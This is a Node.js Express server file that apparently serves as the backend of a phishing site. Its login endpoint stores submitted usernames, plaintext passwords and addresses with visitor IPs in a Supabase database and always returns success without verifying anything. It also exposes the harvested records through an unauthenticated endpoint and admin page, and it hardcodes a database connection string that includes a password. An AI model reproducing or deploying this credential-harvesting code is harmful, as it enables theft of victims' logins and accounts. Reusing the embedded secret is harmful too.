const express = require('express');
const path = require('path');
const { Pool } = require('pg');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// === YOUR SUPABASE POOLER CONNECTION STRING ===
const pool = new Pool({
    connectionString: 'postgresql://postgres.bjyhgxqromtghuvnozog:ibnaira1999@@aws-0-eu-west-1.pooler.supabase.com:6543/postgres',
    ssl: { rejectUnauthorized: false }
});

pool.query(`CREATE TABLE IF NOT EXISTS records (
    id SERIAL PRIMARY KEY,
    type TEXT,
    username TEXT,
    password TEXT,
    address TEXT,
    ip TEXT,
    timestamp TEXT
)`).then(() => console.log("✅ Supabase Connected"))
   .catch(err => console.error("Table Error:", err.message));

function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
    pool.query(
        "INSERT INTO records (type, username, password, address, ip, timestamp) VALUES ($1, $2, $3, $4, $5, $6)",
        [type, username, password, address, ip, timestamp]
    ).then(() => console.log(`✅ Saved: ${type}`))
     .catch(err => console.error("Save Error:", err.message));
}

// Routes
app.get('/', (req, res) => {
    saveRecord('Page Visit', null, null, null, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/login.html', (req, res) => {
    saveRecord('Page Visit', null, null, null, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.post('/api/login', (req, res) => {
    const { username, password, address } = req.body;
    saveRecord('Login Attempt', username, password, address, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
    res.json({ success: true });
});

app.get('/api/records', async (req, res) => {
    try {
        const result = await pool.query("SELECT * FROM records ORDER BY id DESC");
        res.json(result.rows);
    } catch (err) {
        console.error("Query Error:", err.message);
        res.json([]);
    }
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.post('/api/clear', async (req, res) => {
    await pool.query("DELETE FROM records");
    res.json({ message: 'Cleared' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running with Supabase`);
});